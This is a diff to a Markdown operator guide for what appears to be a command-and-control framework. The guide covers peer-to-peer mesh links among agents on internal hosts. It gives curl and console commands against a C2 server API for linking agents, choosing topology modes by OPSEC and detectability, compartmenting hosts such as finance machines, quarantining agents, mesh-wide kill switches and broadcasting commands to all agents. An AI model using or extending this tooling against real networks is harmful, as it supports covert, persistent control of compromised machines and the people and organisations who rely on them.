@@ -421,18 +421,54 @@ orchestra-console send --agent DESKTOP-WIN10 --command DownloadModule --args "sc
 
 ## 9. P2P Mesh Operations
 
-### Establishing Links
+### Establishing Peer Links
 
 ```bash
-# Link agent A (parent) to agent B (child)
-# Send from the server to agent A:
-orchestra-console send --agent DESKTOP-WIN10 --command LinkTo --args "10.0.0.20:4443"
+# Link agent A (parent) to agent B at address 10.0.0.20:4443
+# The server instructs agent A to connect:
+curl -X POST https://c2.example.com/api/mesh/connect \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"parent_agent_id":"DESKTOP-WIN10","child_address":"10.0.0.20:4443"}'
 
-# View topology
-orchestra-console send --agent DESKTOP-WIN10 --command ListTopology
+# Or via orchestra-console:
+orchestra-console send --agent DESKTOP-WIN10 --command MeshConnect \
+  --args "10.0.0.20:4443"
+
+# Disconnect a specific link
+curl -X POST https://c2.example.com/api/mesh/disconnect \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"agent_id":"DESKTOP-WIN10","link_id":"0x00000001"}'
 ```
 
-### Mesh Topology
+### Choosing Topology Mode
+
+Configure `mesh_mode` per agent at build time or via server command:
+
+| Mode | When to Use | Trade-offs |
+|------|-------------|------------|
+| **Tree** | Maximum OPSEC required | No lateral communication; all traffic through server |
+| **Mesh** | Maximum resilience needed | More visible traffic patterns; P2P links detectable |
+| **Hybrid** | General operations (default) | Balanced OPSEC and resilience |
+
+### Mesh Topology Output
+
+```bash
+# View full mesh topology
+curl https://c2.example.com/api/mesh/topology \
+  -H "Authorization: Bearer $TOKEN"
+
+# Example output:
+# Server
+#   └── DESKTOP-WIN10 (parent, internet-facing)
+#         ├── 10.0.0.20:4443 (child) ─── mesh_mode=Hybrid
+#         │     └── 10.0.0.30:4443 (grandchild)
+#         └── 10.0.0.40:4443 (child)
+#               ◄──► peer link to 10.0.0.20:4443
+
+# View mesh statistics
+curl https://c2.example.com/api/mesh/stats \
+  -H "Authorization: Bearer $TOKEN"
+```
 
 ```
 Server
@@ -440,14 +476,113 @@ Server
         ├── 10.0.0.20:4443 (child, internal network)
         │     └── 10.0.0.30:4443 (grandchild)
         └── 10.0.0.40:4443 (child)
+              ◄──► peer link to 10.0.0.20:4443
+```
+
+### Compartment Configuration
+
+Compartments isolate agent groups — only agents in the same compartment can
+form peer links:
+
+```bash
+# Assign agents to compartments
+curl -X POST https://c2.example.com/api/mesh/set-compartment \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"agent_id":"DESKTOP-FIN01","compartment":"finance"}'
+
+curl -X POST https://c2.example.com/api/mesh/set-compartment \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"agent_id":"DESKTOP-ENG01","compartment":"engineering"}'
+
+# DESKTOP-FIN01 and DESKTOP-ENG01 cannot form peer links
+# Cross-compartment traffic routes through the server
 ```
 
 ### Mesh Routing
 
-- Messages are routed through parent agents
-- Each parent maintains a routing table of child `link_id`s
-- Latency increases with depth (add ~50ms per hop)
-- Bandwidth is limited by the slowest link in the chain
+- **Distance-vector routing** automatically discovers optimal paths (Mesh/Hybrid).
+- Routes updated every 60 seconds via `RouteUpdate` frames.
+- Quality metric: 40% latency + 40% packet loss + 20% jitter.
+- Latency increases ~50ms per hop; bandwidth limited by slowest link.
+- **Tree fallback**: If no mesh route exists, data relays through the server.
+
+### Compromise Response Procedures
+
+#### Quarantine a Suspect Agent
+
+```bash
+# 1. Quarantine the agent (stops relaying, keeps server connection)
+curl -X POST https://c2.example.com/api/mesh/quarantine \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"agent_id":"SUSPICIOUS-HOST","reason":2}'
+
+# 2. Verify quarantine in topology
+curl https://c2.example.com/api/mesh/topology \
+  -H "Authorization: Bearer $TOKEN"
+
+# 3. Clear quarantine when resolved
+curl -X POST https://c2.example.com/api/mesh/clear-quarantine \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"agent_id":"SUSPICIOUS-HOST"}'
+```
+
+#### Kill Switch (Mesh-Wide Termination)
+
+```bash
+# Terminate ALL P2P links on a specific agent
+curl -X POST https://c2.example.com/api/mesh/kill-switch \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"agent_id":"DESKTOP-WIN10"}'
+
+# Terminate ALL P2P links mesh-wide (omit agent_id)
+curl -X POST https://c2.example.com/api/mesh/kill-switch \
+  -H "Authorization: Bearer $TOKEN"
+```
+
+> **⚠️ Warning**: Kill switch immediately terminates all P2P links. Agents
+> revert to direct server-only communication. Use only in active compromise
+> scenarios.
+
+### Key Rotation Monitoring
+
+```bash
+# Check link status including key rotation
+orchestra-console send --agent DESKTOP-WIN10 --command ListLinks
+
+# Key rotation runs automatically every 4 hours per link
+# Monitor for failed rotations (retry limit: 3)
+# If rotation fails persistently, the link may need to be re-established
+```
+
+Key rotation timeline per link:
+- **Every 4 hours**: New X25519 ECDH exchange generates fresh link key.
+- **30-second overlap**: Both old and new keys accepted during transition.
+- **60-second timeout**: If no `KeyRotationAck`, rotation is retried.
+- **3 retries max**: After 3 failures, rotation is abandoned (link continues on old key).
+
+### Mesh Performance Tuning
+
+| Parameter | Default | Recommendation |
+|-----------|---------|----------------|
+| Heartbeat interval | 30s | Reduce to 15s for high-churn meshes |
+| Route update interval | 60s | Reduce to 30s for >50 agents |
+| Max children per parent | 10 | Increase for wide networks; decreases per-child bandwidth |
+| Relay throttle fraction | 0.3 | Increase to 0.5 for dedicated relay agents |
+| Dead threshold (missed heartbeats) | 8 | Increase for high-latency satellite links |
+
+### Broadcasting Commands
+
+```bash
+# Broadcast to all agents
+curl -X POST https://c2.example.com/api/mesh/broadcast \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"command":"GetSystemInfo"}'
+
+# Broadcast to a specific compartment
+curl -X POST https://c2.example.com/api/mesh/broadcast \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"command":"GetSystemInfo","compartment":"finance"}'
+```
 
 ---
 
